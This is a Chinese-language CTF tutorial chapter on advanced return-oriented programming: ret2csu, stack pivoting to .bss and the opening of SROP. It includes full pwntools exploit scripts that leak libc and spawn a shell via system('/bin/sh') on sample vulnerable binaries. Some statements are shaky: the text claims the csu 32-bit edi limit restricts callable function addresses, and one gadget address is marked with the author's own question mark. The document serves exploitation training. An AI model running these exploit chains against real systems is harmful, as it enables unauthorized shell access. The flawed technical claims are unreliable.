# 07 ROP 高级技巧

> 前几章的 ROP 都是"缺什么搜什么"，本章解决四个进阶问题：**寄存器凑不齐怎么办（ret2csu / ret2reg / setcontext）**、**栈上放不下长链怎么办（栈迁移 stack pivot）**、**连二进制都没有怎么办（BROP）**、**连 libc 都不用碰怎么办（SROP）**。另附赛场最常见的"隐形杀手"——栈对齐（movaps）专题与一张综合应对策略表。本章技巧与 [11-ORW与沙箱绕过.md](11-ORW与沙箱绕过.md) 深度联动，请配合食用。

## 本章速览

| 小节 | 主题 | 一句话要点 |
| ---- | ---- | ---------- |
| 7.1 | ret2csu | `__libc_csu_init` 两段万能 gadget：任意函数 + 任意 3 参数，64 位"缺 rdx"的标配解法 |
| 7.2 | 栈迁移 stack pivot | 溢出长度不够时，用 leave;ret 等把 esp 搬到 bss/堆，实现"无限 ROP" |
| 7.3 | SROP | 一次 sigreturn 恢复**全部寄存器**，等价于一次"寄存器全控"，免 leak 直接 getshell/orw |
| 7.4 | ret2reg | 某寄存器恰好指向可控数据时，call rax / jmp rdx 直接利用 |
| 7.5 | BROP | 无二进制远程盲打：stop gadget 定位 → brop gadget → dump 内存 → leak libc |
| 7.6 | 栈对齐 | system 内 movaps 要求 rsp 16 对齐；垫 ret / 换 gadget / 调长度三种修法 |
| 7.7 | setcontext 系 gadget | setcontext+53/61 从一块内存批量恢复寄存器，堆题 orw 神器 |
| 7.8 | 综合应对策略表 | 缺 rdx→csu、缺 syscall→libc、长度不够→pivot……一表查尽 |
| 7.9 | 典型例题 | ret2csu 泄露 / leave;ret 迁移 / SROP getshell / BROP 盲打，4 道全流程 |
| 7.10 | 常见坑 | csu 的 call 指针表、leave;ret 二次利用 ebp、SROP frame.rsp、迁移错位 8 字节等 |
| 7.11 | 检查清单 | 赛场上逐项自检 |

前置知识：[04-ret2syscall.md](04-ret2syscall.md)（gadget 搜索、纯 ROP 链式思维）、[05-ret2libc.md](05-ret2libc.md)（leak libc 两段式、栈对齐初识）、[06-ret2plt与ret2dlresolve.md](06-ret2plt与ret2dlresolve.md)（read@plt 写内存、plt0 延迟绑定）。

---

## 7.1 ret2csu 详解（重点）

### 7.1.1 问题背景：64 位下"凑不齐寄存器"

64 位 System V 传参靠 rdi、rsi、rdx、rcx、r8、r9。ret2libc 时 `pop rdi ; ret` 几乎必能找到（`5f c3` 字节太常见），`pop rsi ; pop r15 ; ret` 也好找，但 **`pop rdx ; ret` 在小程序里经常绝迹**（`5a c3` 两个字节的组合概率低得多）。没有 rdx，`write(1, got, 8)`、`execve("/bin/sh", NULL, NULL)` 这类三参调用就拼不出来。

天无绝人之路：**gcc 编译的 64 位 ELF 会自动生成一个 `__libc_csu_init` 函数**（老版 glibc 的初始化钩子），它尾部恰好藏着能**同时设置 rdx、rsi、edi 并调用任意函数指针**的两段 gadget——这就是 ret2csu（return to csu，csu = C Startup Unit）。

先记住判据：

```bash
# 有 __libc_csu_init → ret2csu 可用
$ readelf -s ./pwn | grep csu
44: 00000000004006a0  101 FUNC  GLOBAL DEFAULT   13 __libc_csu_init
```

### 7.1.2 `__libc_csu_init` 是什么

它是 glibc 提供的 C 运行时初始化函数，负责在 main 之前执行 `.init_array` 里的构造函数，由 `__libc_start_main` 调用。Ubuntu 16.04 / gcc 5.4 下的完整反汇编（节选，**形态 A**）：

```asm
__libc_csu_init:
    push    r15
    push    r14
    push    r13
    push    r12
    lea     r13, [rip + init_array]      ; 初始化数组指针
    lea     r14, [rip + init_array_end]
    mov     r15d, edi                    ; 保存 main 的 argc
    push    rbp
    lea     rbp, [rip + init_array]      ; 第二个数组指针
    push    rbx
    sub     rsp, 8
    ...
    call    _init
    test    r14, r14
    jz      short loop_end
loop_start:                              ; 遍历 init_array
    mov     rdx, [r14]                   ; 取出函数指针
    ...
loop_end:
    add     rsp, 8
    pop     rbx
    pop     rbp
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    ret                                  ; ★ gadget1 就在这里

; 紧接着是循环体的收尾部分（被上面的 pop 段"穿过"）：
    mov     rdx, r13                     ; ★ gadget2 开始
    mov     rsi, r14
    mov     edi, r15d
    call    qword ptr [r12 + rbx*8]
    add     rbx, 1
    cmp     rbx, rbp
    jne     short gadget2                ; 没遍历完就继续
    add     rsp, 8
    pop     rbx
    pop     rbp
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    ret                                  ; ★ gadget2 结束
```

编译器把"循环收尾 + 函数尾声"交织排布，正好形成了两段教科书级 gadget：

- **gadget1（csu_pop）**：`pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` —— 一次控制 6 个寄存器；
- **gadget2（csu_call）**：`mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12 + rbx*8]` —— 把刚才 pop 进去的值**搬运到 3 个参数寄存器并调用函数**。

### 7.1.3 两段 gadget 的"接力"语义

用 pwntools 风格伪代码描述一次完整接力：

```text
gadget1:  pop rbx,rbp,r12,r13,r14,r15 ; ret
          └─ 从栈上依次弹 6 个值填入寄存器，然后 ret 到栈上下一个地址（= gadget2）

gadget2:  mov rdx, r13      ; 第 3 参数 ← r13
          mov rsi, r14      ; 第 2 参数 ← r14
          mov edi, r15d     ; 第 1 参数 ← r15 低 32 位（注意是 edi！）
          call [r12 + rbx*8] ; 调用"位于 r12+rbx*8 这块内存里存的函数指针"
          add rbx, 1        ; 循环计数 +1
          cmp rbx, rbp
          jne  gadget2      ; rbx != rbp 则再调一次（指针表下一项）
          add rsp, 8        ; ① 吞掉 8 字节
          pop rbx,rbp,r12,r13,r14,r15   ; ② 再吃 48 字节
          ret               ; ③ ret 到第 8 个槽
```

**两个关键设计**（后面所有 exp 都建立在它们上面）：

1. `call [r12 + rbx*8]`：调用的不是 r12 本身，而是 **r12 指向的内存里存的指针**。想调 `puts`，就让 r12 指向 `puts@got`——因为 GOT 里存的正是 puts 的真实地址，`call [puts@got]` 等价于 `call puts`。
2. gadget2 的收尾 `add rsp,8 + pop×6 + ret` 共消耗 **7 个栈槽（56 字节）**：这既是麻烦（链上要垫 7 个废值），也是宝贝（相当于自带一个"跳 7 格"的加长 pop，能把后面的链接上）。

**链式循环技巧**：把 rbx 设为 0、rbp 设为 1——call 结束后 `add rbx,1` 使 rbx==rbp，`jne` 不成立，顺序落入收尾段。如果想让一轮 csu **连调多个函数**，就把 rbp 设成 n：每轮 rbx 自增 1，`call [r12+rbx*8]` 依次调用 r12 指针表的第 0、1、…、n-1 项，凑够 n 个函数指针后自然退出。这是"一次溢出连调 read+puts"的常用压缩手段。

### 7.1.4 通用调用原语模板（64 位）

把它封装成函数，exp 里直接"填表"：

```python
def csu_call(r12, rdx, rsi, edi, rbx=0, rbp=1, next_addr=None):
    """用 __libc_csu_init 两段 gadget 调用 func(edi, rsi, rdx)。
    r12   : 指向"函数指针"的地址（通常是某个 got 表项地址）
    rbx   : 指针表下标，一般 0（则 call [r12+0] 即调用 r12 指的那个函数）
    rbp   : 循环终止值，一般 1（调一次就退出循环）
    edi   : 第 1 参数，只能写低 32 位（mov edi, r15d）
    返回拼接好的字节串；调用结束后 ret 到 next_addr
    """
    if next_addr is None:
        next_addr = elf.symbols.get('main')   # 默认回 main，方便打第二轮
    rop  = p64(csu_gadget1)          # pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret
    rop += p64(rbx)                  # → rbx
    rop += p64(rbp)                  # → rbp
    rop += p64(r12)                  # → r12（函数指针表基址）
    rop += p64(rdx)                  # → r13 → gadget2 里 mov rdx, r13
    rop += p64(rsi)                  # → r14 → mov rsi, r14
    rop += p64(edi)                  # → r15 → mov edi, r15d
    rop += p64(csu_gadget2)          # gadget1 的 ret 落点：设置参数并 call
    rop += p64(0) * 7                # gadget2 收尾 add rsp,8 + pop×6 吃掉的 7 个槽
    rop += p64(next_addr)            # 最后的 ret 落点
    return rop
```

调用一次的完整栈图（从覆盖返回地址开始，一格格读）：

```text
栈（自溢出点向高地址）                          执行阶段
┌──────────────────┐
│ 'A'*offset        │ ← 填充到 saved rbp
├──────────────────┤
│ gadget1 地址      │ ← ret①：进入 csu_pop
├──────────────────┤
│ rbx = 0           │ pop rbx
├──────────────────┤
│ rbp = 1           │ pop rbp
├──────────────────┤
│ r12 = &func_got   │ pop r12   （函数指针表）
├──────────────────┤
│ r13 = rdx 参数    │ pop r13
├──────────────────┤
│ r14 = rsi 参数    │ pop r14
├──────────────────┤
│ r15 = edi 参数    │ pop r15
├──────────────────┤
│ gadget2 地址      │ ret②：进入 csu_call
├──────────────────┤
│ pad(8字节)        │ add rsp,8 吞掉
├──────────────────┤
│ pad ×6 (48字节)   │ pop rbx,rbp,r12,r13,r14,r15 吞掉
├──────────────────┤
│ next_addr (main)  │ ret③：开始下一段链
└──────────────────┘
```

### 7.1.5 两种主流形态对照（Ubuntu 16.04 vs 18.04）

不同 gcc 版本把循环变量分配得不一样，**抄 writeup 地址前必须对照实际反汇编**：

| | 形态 A（gcc 5.x，Ubuntu 16.04 最常见） | 形态 B（gcc 7.x，Ubuntu 18.04 常见） |
| ---- | ---- | ---- |
| gadget1 | `pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret` | 相同 |
| gadget2 参数搬运 | `mov rdx,r13; mov rsi,r14; mov edi,r15d` | `mov rdx,r15; mov rsi,r14; mov edi,r13d` |
| call | `call [r12 + rbx*8]` | 相同 |
| 形态 B 对应填法 | r12=指针表, r13=arg3, r14=arg2, r15=arg1 | r12=指针表, **r15=arg3, r14=arg2, r13=arg1** |

识别方法：`objdump -d -j __libc_csu_init ./pwn`（或 ROPgadget 搜 `mov rdx`）看 `mov rdx, r??` 是谁，再按上表决定参数填进哪个槽。**填错形态 = 参数全部错位，函数调用直接崩**，属于 ret2csu 第一大坑。

### 7.1.6 完整例：csu 调 puts(puts@got) 泄露 libc

目标函数（编译：`gcc -m64 -fno-stack-protector -no-pie csu.c -o csu`）：

```c
// csu.c —— 只有 read，没有任何现成的输出原语
#include <unistd.h>

int main() {
    char buf[0x50];
    read(0, buf, 0x100);        // 溢出 0x50 → 能覆盖到返回地址之后
    return 0;                   // 程序自身调用了 read/puts(初始化)，PLT 里可用
}
```

思路：

```text
程序只有 read@plt 可用，无法直接打印；pop rdx 也搜不到。
→ 用 csu gadget2 调用 puts@plt 所指向的 puts（通过 puts@got 指针表）
   puts(puts@got) 会把 GOT 里存的 libc puts 地址当字符串打印 → 泄露 libc
→ 链尾回 main，第二轮普通 ret2libc：pop rdi + system("/bin/sh")
```

完整 exp（`csu_gadget1/csu_gadget2` 用 `ROPgadget --binary csu | grep "pop rbx"` 自查，典型值如下）：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
p   = process('./csu')
elf = ELF('./csu')
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')   # 远程时换题目附件

# ---- 手工定位两段 gadget（地址因编译版本而异，务必自查）----
csu_gadget1 = 0x4006AA   # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
csu_gadget2 = 0x400690   # mov rdx,r13 ; mov rsi,r14 ; mov edi,r15d ; call [r12+rbx*8]
                         # ... 收尾 add rsp,8 ; pop×6 ; ret
pop_rdi_ret = 0x4006AB + 8   # 形态 A 中 gadget1 的 +8 处即 "pop rdi ; ret"？见 7.1.7 说明
ret_gadget  = 0x4004FE   # 单独一个 ret，垫栈对齐用

offset    = 0x50 + 8        # buf + saved rbp
puts_got  = elf.got['puts']
main_addr = elf.symbols['main']

# ---- 第一轮：csu 调 puts(puts@got) 泄露 libc ----
rop1  = b'A' * offset
rop1 += p64(csu_gadget1)
rop1 += p64(0)              # rbx = 0        → call [r12 + 0*8] = call [puts_got] = puts
rop1 += p64(1)              # rbp = 1        → add rbx,1 后相等，退出循环
rop1 += p64(puts_got)       # r12 = puts_got → 被调函数指针就存在这里
rop1 += p64(0)              # r13 → rdx（第 3 参，puts 用不到）
rop1 += p64(0)              # r14 → rsi（第 2 参，puts 用不到）
rop1 += p64(puts_got)       # r15 → edi（第 1 参 = puts 的实参 = 打印 GOT 内容）
rop1 += p64(csu_gadget2)    # gadget1 ret 落点：搬参数 + call puts
rop1 += p64(0) * 7          # 收尾吃掉的 7 个槽
rop1 += p64(main_addr)      # 泄露后回 main，准备第二轮
p.sendlineafter(b'?', rop1) # 按题目实际提示调整
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
success(f'libc base = {hex(libc.address)}')

# ---- 第二轮：普通 ret2libc，system("/bin/sh") ----
system_addr = libc.sym['system']
binsh       = next(libc.search(b'/bin/sh\x00'))
rop2  = b'A' * offset
rop2 += p64(ret_gadget)          # 垫栈对齐（见 7.6）
rop2 += p64(pop_rdi_ret)
rop2 += p64(binsh)
rop2 += p64(system_addr)
p.sendlineafter(b'?', rop2)

p.interactive()
```

几个设计要点：

- **为什么 call 的指针表填 `puts_got`**：`call [r12+rbx*8]` 会取 `puts_got` 内存里的值（puts 的 libc 真实地址）去 call，等于调用 puts 本体；同时把 `puts_got` 作为 edi 传参，让 puts 打印 GOT 表项内容——一个地址身兼"被调函数"与"被打印数据"两职，这是 ret2csu 泄露的标准姿势。
- **`ljust(8, b'\x00')`**：puts 输出以换行结尾且地址高字节常为 0，补齐到 8 字节再 `u64`。
- **为什么第二轮不用 csu 调 system**：见 7.1.7 第 2 条。

### 7.1.7 ret2csu 的四个固有限制

1. **edi 只能写 32 位**。`mov edi, r15d` 会把 rdi 高 32 位清零，所以 csu 只能调用**地址低于 2^32 的函数**——非 PIE 程序的 PLT/GOT（0x400000~0x401000 或 0x601xxx 指针表）没问题，**libc 里的 system（6 位地址）不行**。因此 csu 的定位是"第一轮工具人：泄露、写内存"，getshell 那一跳通常仍要靠普通 gadget（本题用 pop rdi）。
2. **call 的是 `[r12+rbx*8]` 里的值，r12 指向的内存必须可读**。填 r12 = 某个 got 表项最稳；千万别把 r12 填成函数地址本身（那样会 call 到该地址内存的前 8 字节当成指针，多半段错误）。
3. **收尾固定吃 7 个槽**。链式排布时每个 csu_call 块后都要垫 `p64(0)*7 + p64(next)`，忘了垫就会 ret 到垃圾。这 7 个槽同时也是**给下一轮 csu 的 rbx/rbp/r12… 预填**的地方——把下一轮的 6 个寄存器值直接排在这里，再用一个额外 gadget 接走，可以省去重复 gadget1（进阶技巧，可参考 `csu` 循环体的 jne 回跳自动实现连调）。
4. **gadget1 内部藏有 "pop rdi ; ret"**。形态 A 中 gadget1 字节为 `5b 5d 41 5c 41 5d 41 5e 41 5f c3`，从 +7 处开始解释：`5e 41 5f c3` = `pop rsi ; pop r15 ; ret`，从 +9 处：`41 5f c3` = `pop r15 ; ret`。csu 附近（gadget1 地址 -2 处通常有 `5f c3` = `pop rdi ; ret`，即 gadget2 区域字节重叠产生）——搜 gadget 时把 csu 前后 ±16 字节翻一遍，经常白捡 rdi。这也是 BROP 能用 csu 片段泄露的根本原因（7.5）。

### 7.1.8 新版程序没有 `__libc_csu_init` 怎么办

glibc 2.34 起，`__libc_csu_init` / `__libc_csu_fini` 被移除；gcc 11+ 默认也不再生成。替代思路按优先级：

1. **`_init` / `.init_array` 周边**：`__libc_csu_init` 没了，但 `_init` 函数和 init_array 机制还在，`_init` 尾部及附近有零散 `pop rbp; pop r12..r15; ret`（价值减半：通常凑不齐 rdx）。
2. **`__libc_start_main` / `__libc_start_call_main` 周边**：程序入口的调用链上有 `mov rdx, ...`、`pop rdx` 类指令的残留，用 `ROPgadget --binary ./pwn --depth 15 | grep "rdx"` 大范围搜。
3. **直接去 libc 找**：动态链接 + 给了 libc 附件时，libc 里 `pop rdx ; ret`、`mov rdx, rbx` 一抓一大把——先 leak libc（哪怕用只有 rdi 的 puts），之后一切 gadget 都从 libc 取。**这比硬啃二进制高效得多**，也是现代题的主流路线。
4. **SROP / setcontext 兜底**：连 rdx 都只要一次时，直接看 7.3、7.7——一次 sigreturn 一次性摆平全部寄存器。

> 32 位为什么不需要 csu？32 位参数全在栈上（cdecl 约定），call 之前只需要"在栈上摆好参数"，任何 `ret` 都能完成调用，根本不存在凑寄存器的问题——所以 ret2csu 是 64 位专属技巧。

---

## 7.2 栈迁移 stack pivot 专题

### 7.2.1 为什么需要栈迁移

典型困境：

```c
int main() {
    char buf[0x10];
    read(0, buf, 0x20);   // 只能溢出 0x10 字节：刚好盖住 saved rbp(8) + 返回地址(8)
    return 0;             // 链上除了返回地址，一个 gadget 都摆不下！
}
```

返回地址只能放**一个** gadget 地址，而 leak→system 两段式至少要十几个槽。栈迁移（stack pivot）的思路：

> **ROP 的本质，是让 esp/rsp 一步步"走到"我们准备好的数据上。既然当前栈上放不下数据，就把 rsp 搬到一块我们完全可控的大空间（bss、堆）去，那里想放多长的链都行。**

### 7.2.2 原理图解

```text
          当前栈（放不下链）                    目标区（bss / 堆，随便放）
   低addr                                            低addr
  ┌─────────────┐                                  ┌──────────────────────┐
  │ buf 0x10     │                                  │ gadget1              │ ← 新 rsp
  │ saved rbp ★① │ ← 覆盖成"目标区某地址 X"           │ gadget2              │
  │ ret addr ★②  │ ← 覆盖成"换栈 gadget"             │ gadget3              │
  └─────────────┘                                   │ ...长长长长长长长链... │
        换栈 gadget 干的事：rsp ← X                  └──────────────────────┘
        随后的 ret 从新 rsp 取地址执行                  高addr
```

只要让"被覆盖的返回地址"指向一个**能把 rsp 换到 X 的 gadget**，程序接下来的一切 ROP 都发生在新区。下面按溢出长度从充裕到抠门逐个讲方法。

### 7.2.3 方法一：`leave ; ret`（覆盖 saved ebp，最经典）

**原理**。`leave` 等价于 `mov esp, ebp ; pop ebp`——它本来就是"退帧"指令，天然就是一次栈迁移：把 esp 拉到 ebp 指的地方。而 ebp 是我们**恰好能覆盖**的（它就躺在 buf 后面）。

设我们把 saved ebp 覆盖为 X（X 是 bss 上链区），返回地址覆盖为 `leave_ret` gadget 地址。逐条跟踪 32 位（`leave` 里 pop 是 4 字节）：

```text
main 尾部的 leave;ret（正常退帧）：
  leave:  esp = ebp            ; esp 指向 saved ebp 槽（值已被覆盖为 X）
          pop  ebp             ; ebp ← X        esp → 返回地址槽
  ret:    eip ← leave_ret      ; esp → 返回地址槽+4

进入 leave;ret gadget：
  leave:  esp = ebp = X        ; ★ 迁移发生：esp 被拉到 bss 的 X 处
          pop  ebp             ; ebp ← [X]，esp = X+4
  ret:    eip ← [X+4]          ; ★ 从 X+4 开始执行新链！
```

**结论（32 位）：链的第一条 gadget 要放在 `X+4`，即 `fake_ebp = 链首地址 - 4`。**
64 位同理（pop 8 字节）：**链首放在 `X+8`，即 `fake_rbp = 链首地址 - 8`**。这就是新手最容易踩的"错位"问题（详见 7.10.4），务必用栈图亲自推一遍。

**利用条件**：
- 溢出能覆盖 saved ebp + 返回地址（至少 offset+8 字节）；
- 程序里有 `leave; ret`（几乎必有——任何有栈帧的函数结尾就是，ROPgadget 直接搜）；
- 链数据已事先写入 X 处（见 7.2.9 的 read@plt 套路）。

**变体：只覆盖 saved ebp 低 1 字节的"半迁移"**。某些题只能盖到 saved ebp 的低字节（如堆题的 off-by-one，见 [09-整数溢出与Off-by-One.md](09-整数溢出与Off-by-One.md)）。把 ebp 低位改成指向可控区（如 ebp 所指缓冲区内某偏移），程序正常退出时 `mov esp,ebp` 会把 esp 拉到原 ebp 附近、`pop ebp` 后 ret——等效于把执行流"偏移"到可控数据上，1/16 概率对齐（低 4 位页内不变，只需低半字节恰好合适），常需爆破或精心对齐。这招在堆题 house of force / off-by-one 迁移里是标配。

### 7.2.4 方法二：`pop ebp ; ret` + `leave ; ret`（溢出更抠门时）

`leave` 有个隐藏能力：它是**可复用**的。若溢出只够覆盖返回地址（连 saved ebp 都盖不到），就分两步：

```text
第 1 步：返回地址 → pop ebp ; ret      ; 把 ebp 从栈上"读"成我们想要的 X
         （栈上下一个槽放着 X）
第 2 步：再 ret 到 leave ; ret         ; 触发迁移：esp ← X
```

栈图：

```text
┌──────────────────┐
│ 'A'*offset        │
│ saved ebp（盖不到）│
├──────────────────┤
│ pop_ebp_ret       │ ← 返回地址
├──────────────────┤
│ X                 │ ← 被 pop 进 ebp
├──────────────────┤
│ leave_ret         │ ← 下一条：执行迁移
└──────────────────┘
之后同方法一：leave: esp=X → pop ebp → ret 取 [X+4]
```

这是 32 位 off-by-4（只溢出返回地址）场景下的标准起手式。

### 7.2.5 方法三：`add rsp, N ; ret` / `sub rsp, N ; ret`（原地滑动）

不想换区域、只想"跳过"链上某段（比如链被夹在中间）：

```asm
add rsp, 0x28 ; ret    ; esp 一次性前移 0x28，跳过 5 个槽
```

用途：① payload 结构里"前面的槽是垃圾"时快速对位；② 配合 fgets/read 的截断行为把链分成两半；③ **半迁移**的收尾——把 esp 滑进可控区。搜法：`ROPgadget --binary pwn | grep "add rsp"`。注意 32 位里等价物是 `add esp, N ; ret`。

### 7.2.6 方法四：寄存器换栈 `xchg eax, esp` / `mov esp, xxx`

```asm
xchg eax, esp ; ret        ; esp 与 eax 互换
mov esp, eax ; ret / call rax（见 7.4 ret2reg）
```

适用情形：**某寄存器恰好存着/能算出目标地址**。最常见的巧合是 `read`/`fgets` 的**返回值 = 读入字节数，存放在 eax/rax**——如果我们让程序把链读到一个已知地址，紧接着返回地址处放 `xchg eax, esp ; ret`，只要"读入的字节数"恰好等于该地址（可以把 read 的第三个参数 n 控制成那个数值，或读这么长一段填充），就能把 rsp 精确迁移过去。这类迁移可遇不可求，见到 `xchg esp, eax`、`mov esp, edx` 先记在 gadget 清单里备用。

### 7.2.7 方法五：setcontext 迁移（一次换栈 + 全寄存器重置）

如果只能写一块固定内存、又想要"换栈 + 恢复一堆寄存器"，`setcontext`（7.7）一步到位：fake ucontext 里 rsp、rip、rdi、rsi、rdx 全部按需设置，`setcontext+53` 自己完成迁移。它是"高级版 stack pivot"，细节见 7.7。

### 7.2.8 迁移目标：bss 与堆

| 目标 | 前提 | 典型配合 |
| ---- | ---- | ---- |
| .bss | 地址固定（非 PIE）/ 需先 leak PIE | **read@plt 把链写进去**（06 章的 ret2plt），或程序本身会往 bss 读入 |
| 堆 | 需 leak 堆地址（printf("%p")、bss 上的指针、environ） | 堆题：malloc 出来的 chunk 内容完全可控，直接把链写在 chunk 里 |

bss 是首选：非 PIE 时地址写死，且配合 `read@plt` 可以**反复重写、无限 ROP**。堆迁移则多见于堆题变体（unlink、house of 系列把伪栈搭进堆里）。

### 7.2.9 套路：read@plt + bss = 无限 ROP

标准三步：

```text
① 溢出阶段（长度只够塞 3~4 个 gadget）：
   链A：read(0, BSS_CHAIN, 0x200)   ← 第一次运行时把长链写进 bss
   链尾：leave;ret（配合 fake_ebp）或 ret 到 BSS_CHAIN
② 第二轮：链B 完整执行（leak libc、回 main、读第三轮……）
③ 循环 ②：每次 read 重写 bss，链想多长有多长 → "无限 ROP"
```

### 7.2.10 完整 exp（32 位）：迁移到 bss 无限 ROP

目标（编译 `gcc -m32 -fno-stack-protector -no-pie pivot32.c -o pivot32`）：

```c
// pivot32.c —— 溢出长度只有 8 字节（盖 ebp + ret）
#include <unistd.h>

char blob[0x200];              // 大缓冲：在 .bss

int main() {
    char s[0x10];
    read(0, blob, 0x200);      // ① 先读长数据进 bss（题目通常自带这类输入点）
    read(0, s, 0x18);          // ② 再溢出：0x10 buf + 4 ebp + 4 ret
    return 0;
}
```

思路：

```text
溢出只有 8 字节 → 只能放 fake_ebp + leave;ret。
第一笔输入把"完整 ROP 链"写进 blob（bss），第二笔触发迁移到链首。
链A：puts(puts@got) 泄露 → read(0, CHAIN_B, 0x100) 读第二轮链 → ret 到 CHAIN_B
链B（拿到 libc 后在本地拼好随第二笔 read 发送）：system("/bin/sh")
```

完整 exp：

```python
from pwn import *

context(arch='i386', os='linux', log_level='info')
p   = process('./pivot32')
elf = ELF('./pivot32')
libc= ELF('/lib32/libc.so.6')            # 以题目附件为准

# ---- gadget / 关键地址（ROPgadget 自查）----
leave_ret  = 0x0804859A   # leave ; ret
pop3_ret   = 0x08048569   # pop ebx ; pop esi ; pop ebp ; ret（给调用方清栈）
read_plt   = elf.plt['read']
puts_plt   = elf.plt['puts']
puts_got   = elf.got['puts']
main_addr  = elf.symbols['main']

CHAIN_A = elf.bss() + 0x100    # 链A 落点：bss 上的链首
CHAIN_B = elf.bss() + 0x300    # 链B 落点：与链A 不重叠，避免 read 自覆盖
FAKE_EBP= CHAIN_A - 4          # ★ 32 位：链首 = fake_ebp + 4（见 7.2.3）

# ============ 第一笔：把链A 写进 bss ============
chain_a = b''
chain_a += p32(puts_plt) + p32(pop3_ret) + p32(puts_got)      # puts(puts_got) 泄露 libc
chain_a += p32(read_plt) + p32(pop3_ret) + p32(0) + p32(CHAIN_B) + p32(0x100)
                                              # read(0, CHAIN_B, 0x100) 读入链B
chain_a += p32(CHAIN_B)                       # read 返回后 ret 到链B 首部
assert len(chain_a) <= 0x200
p.send(chain_a)                                # 对应第一个 read(0, blob, 0x200)

# ============ 第二笔：8 字节溢出，触发迁移 ============
p.send(p32(FAKE_EBP) + p32(leave_ret))
# 追踪：main 的 leave;ret → eip=leave_ret 且 ebp=FAKE_EBP
#       gadget 的 leave: esp=FAKE_EBP → pop ebp → ret 取 [FAKE_EBP+4] = 链A 第一条

# ============ 收泄露，拼链B ============
leak = u32(p.recvline().strip().ljust(4, b'\x00'))
libc.address = leak - libc.sym['puts']
success(f'libc base = {hex(libc.address)}')
system_addr = libc.sym['system']
binsh       = next(libc.search(b'/bin/sh\x00'))

chain_b = p32(system_addr) + p32(0xdeadbeef) + p32(binsh)
p.send(chain_b.ljust(0x100, b'\x00'))        # 对应 read(0, CHAIN_B, 0x100)

p.interactive()
```

要点：

- `FAKE_EBP = CHAIN_A - 4`：把"链首 = fake_ebp+4"的错位**吸收进 fake_ebp**，链A 就可以从 CHAIN_A 连续摆，不必中间空 4 字节。
- 链A 里 `read` 的目标选 CHAIN_B（与链A 区隔开），避免读入数据踩掉还没执行完的链A 尾部。
- `send` 而非 `sendline`：read 按**字节数**读，多余换行会污染下一轮 read 的首字节。

### 7.2.11 完整 exp（64 位）：迁移到 bss

64 位差别：`pop rdi/rsi/rdx` 传参、错位是 **+8**、read 前需 rdi=0/rsi=buf/rdx=n（用程序里现成 gadget 或 csu）。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
p   = process('./pivot64')                    # 同款双 read 程序，64 位编译
elf = ELF('./pivot64')
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x401243      # pop rdi ; ret
pop_rsi_r15 = 0x401241  # pop rsi ; pop r15 ; ret
pop_rdx = 0x401244      # 若二进制里没有：用 ret2csu（7.1）或 libc gadget
leave_ret = 0x40123B    # leave ; ret
ret_g     = 0x401016    # ret（垫对齐）

CHAIN_A = elf.bss() + 0x500
CHAIN_B = elf.bss() + 0x900
FAKE_RBP = CHAIN_A - 8        # ★ 64 位错位 8 字节

# 链A：puts(puts_got) → read(0, CHAIN_B, 0x200) → 跳 CHAIN_B
chain_a  = b''
chain_a += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])   # 泄露
chain_a += p64(pop_rdi) + p64(0)
chain_a += p64(pop_rsi_r15) + p64(CHAIN_B) + p64(0)
chain_a += p64(pop_rdx) + p64(0x200)
chain_a += p64(elf.plt['read'])                                         # 读链B
chain_a += p64(CHAIN_B)                                                 # ret 到链B
p.send(chain_a.ljust(0x200, b'\x00'))       # 第一笔 read(0, blob, 0x200)

p.send(b'A' * 0x10 + p64(FAKE_RBP) + p64(leave_ret))   # 第二笔溢出 0x20

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
binsh = next(libc.search(b'/bin/sh\x00'))

chain_b  = p64(ret_g) + p64(pop_rdi) + p64(binsh) + p64(libc.sym['system'])
p.send(chain_b.ljust(0x200, b'\x00'))       # 对应 read(0, CHAIN_B, 0x200)

p.interactive()
```

64 位没有 `pop rdx` 时：链A 的 `read(0, CHAIN_B, 0x200)` 改用 **ret2csu**（7.1.4 的 `csu_call(r12=read_got, rdx=0x200, rsi=CHAIN_B, edi=0)`）完成——csu 与 pivot 是天生一对：**csu 负责"传参调函数"，pivot 负责"给 csu 腾地方"**。

### 7.2.12 变体与延伸

- **迁移到堆**：链写在 malloc 出来的 chunk 里，`fake_ebp = chunk_addr - 4/-8`。前提是先 leak 堆地址（`printf("%p")`、bss 里残留指针、`environ` 泄露栈后回溯）。堆题里更常见的是 unlink 直接改全局指针 + 构造伪栈，见 [10-堆漏洞全解.md](10-堆漏洞全解.md)。
- **迁移到栈上更低处**：leak environ 得到栈地址后，把链写在环境变量区/更深的栈帧里，绕过"溢出长度不足"。
- **one_gadget + 迁移**：若 one_gadget 约束差一口气，先 pivot 到可控区再用 frame/setcontext 调 rsp 满足约束（联动 5.5、7.7）。

---

## 7.3 SROP 专题

### 7.3.1 sigreturn 系统调用的语义

Unix 信号机制回顾：进程收到信号时，内核先**把当前全部寄存器现场（sigcontext）保存到用户栈上**，再跳到信号处理函数（或默认 restorer 代码）；处理函数返回时执行 `sigreturn` 系统调用（64 位调用号 **15**，32 位 `rt_sigreturn` 为 **119**），内核**从用户栈上的 sigcontext 原样恢复所有寄存器**——包括 rsp、rip。

```text
正常信号流程：
  内核 → 在用户栈压入 rt_sigframe{pretcode, ucontext{sigcontext}} → 跳 handler
  handler 返回 → pretcode 跳到 restorer → mov rax,15 ; syscall (rt_sigreturn)
  内核 → 从用户栈 sigcontext 恢复 rax..r15、rsp、rip → 回到被打断处

攻击视角：
  sigcontext 就在"用户可控的栈内存"里，内核恢复时毫不设防！
  只要 ① 让栈上躺着一份伪造的 sigcontext（SigreturnFrame）
       ② 让 rax = 15 且执行 syscall
  → 内核替我们把 rdi/rsi/rdx/rax/rsp/rip **全部**设置成想要的值
